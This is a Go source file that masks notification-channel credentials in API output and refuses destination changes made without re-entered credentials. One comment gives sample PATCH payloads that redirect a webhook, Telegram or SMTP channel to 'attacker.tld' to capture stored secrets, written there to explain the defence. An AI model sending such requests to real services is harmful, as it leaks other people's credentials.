package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials it replaces the real
// content with a value carrying this prefix, and when the update endpoint receives a value with this prefix it
// understands it as "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so a little recognisable information can be
// carried along (see MaskedValue), letting the user tell "which bot this is" without pasting the secret again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original value is too short, no hint is given
//	"__masked__:…ab12cd"      carries the last 6 characters of the original value as a recognition hint
//
// Exposing only the last 6 characters is deliberate: the identifying part of a webhook address is its last
// segment (such as WeCom's key or the Feishu bot id), while the prefix part is the same for every bot and has
// no identifying value. The last 6 characters are not enough to reconstruct the credential, but are enough for
// the person configuring it to recognise "that is my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged since the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields replaced by masked values.
//
// An unknown channel kind returns an empty map rather than the original config: better for the UI to show
// "config unavailable" than to spit out the raw content, which may contain credentials, when the channel kind
// cannot be recognised. Non-credential fields are kept as they are so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures such as headers are treated as one credential as a whole: judging each sub-key would
		// require every channel to declare another set of rules about "which sub-keys are credentials", and the
		// complexity far exceeds the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller did not take a position
// on the credential fields". It is returned rather than silently letting the change through or silently dropping credentials; see PrepareConfigUpdate for the reasons.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") has changed; also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): enter a new value, or leave a field explicitly blank if it no longer needs a credential. " +
		"The old credential is only valid for the old address; keeping it would hand it to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a "destination change".
//
// It replaces the bare MergeConfig on the channel update path and closes a path that has been shown to work in
// practice: the destination (where messages go) and the credentials (the identity used to send) are two
// independent sets of fields, and MergeConfig keeps the stored value for any "unmentioned key". So anyone who can
// PATCH a channel only has to **change the address and say nothing about the credentials** to make the server
// send the real stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over username and password after STARTTLS
//
// This path is completely silent and does not depend on redirects (so refusing cross-host redirects does not stop
// it), and it directly defeats the goal of this package's masking mechanism: "credentials are not echoed to the
// browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must take an explicit position on
// **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (the clearing semantics are kept)
//   - send the masked value back as is / do not mention the key at all → rejected
//
// The third is rejected too because the meaning of a "masked value" is exactly "keep the old credential", and the
// old credential is only valid for the old address. "Automatically dropping the credentials" is deliberately not
// done here: for optional credential fields (webhook headers, email password) it would silently turn into
// "authentication is gone but the API returns 200", which is harder to troubleshoot than an error. Better to make
// the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel kind %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A non-string credential value (such as webhook headers, which is an object) that embeds the mask literal means
	// the caller stuffed the "keep the original value" sentinel inside the structure. MergeConfig only recognises "a
	// string with the prefix" as a mask, so this shape would be stored as an ordinary object: the literal
	// "__masked__" really lands in the database, and later authentication silently fails with no error at all.
	// Better to reject it.
	//
	// This check must go **first**: when the address has not changed we take the early return, and putting it later
	// would cover only the "address changed" path (the first version placed it wrongly like this, and the tests
	// caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were really changed. A masked value counts as "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address is unchanged: do a normal merge (masked values keep the original, empty strings clear, everything else overrides).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field such as webhook headers can only
// be masked as a whole (written as the string "__masked__") or submitted as a whole; stuffing the sentinel
// inside the object can neither express "keep unchanged" nor avoid being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left blank as a whole to keep the stored value, or submitted as a whole with a new value; a mask placeholder cannot be smuggled inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares two config values for equivalence. JSON serialisation is used so type differences are
// handled too: the port submitted by the frontend is a number, while what is read back from the database is
// float64, and a direct == would misjudge.
//
// "Empty" must be normalised before comparing: an empty string and "key absent" are the same state in this
// config model, because MergeConfig treats an empty string as an explicit clear and deletes the key outright.
// Without normalisation, an optional destination field that is always left blank (Telegram's base_url is the
// only such field: blank means use the official address) would walk down this path:
//
//	base_url:"" is stored on creation  →  the first save has the key deleted by MergeConfig
//	→ on the second save incoming is "" while stored has no key, so it is judged "address changed"
//	→ the credential is a masked value → 400 "destination has changed, also re-enter the credential fields"
//
// From then on every save fails unless the user pastes the Bot Token again, although they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "empty".
// Its criterion must be consistent with MergeConfig's clearing criterion (strings.TrimSpace(s) == ""),
// otherwise there is a gap where "MergeConfig thinks it should be deleted, but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - a key in incoming whose value is masked → keep the stored value (the user did not change this field)
//   - a key in incoming whose value is an empty string → treated as an explicit clear, the key is deleted
//   - any other key → overridden with the incoming value
//   - a key in stored but not in incoming → kept (partial-update semantics)
//
// Whether an empty string counts as "clear" must be made explicit: the frontend form submits unfilled fields as
// empty strings, and treating them as valid values and writing them in would really wipe fields that were meant
// to "stay blank to keep the original value". Explicit clearing is chosen here because, when the user wants to
// remove a wrongly set field, there is no other way to express it (dropping the field would distinguish "not
// provided" from "provided empty", but the UI does not need that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
